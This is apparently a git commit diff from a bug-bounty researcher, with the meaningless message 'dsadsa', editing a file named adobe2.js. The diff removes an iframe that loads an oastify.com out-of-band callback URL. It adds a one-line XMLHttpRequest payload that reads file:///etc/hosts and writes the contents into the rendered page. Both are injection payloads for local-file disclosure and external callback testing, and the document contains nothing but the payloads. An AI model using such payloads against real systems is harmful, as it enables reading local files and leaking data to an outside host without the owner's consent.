4e77c4912d1a1076cd12b0c955dcc56fde5985f7
mrhavit <mrhavit@wearehackerone.com>
2025-09-11 11:02:37 +0300

    dsadsa

--- adobe2.js
+++ adobe2.js
@@ -1,6 +1,1 @@
-const iframe = document.createElement("iframe");
-iframe.src = "http://7emwqpeb6dztndtyi1jy9it4ivomcj08.oastify.com/dsadsa";
-iframe.width = "600";
-iframe.height = "400";
-iframe.style.border = "1px solid black";
-document.body.appendChild(iframe);
+x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/hosts');x.send();
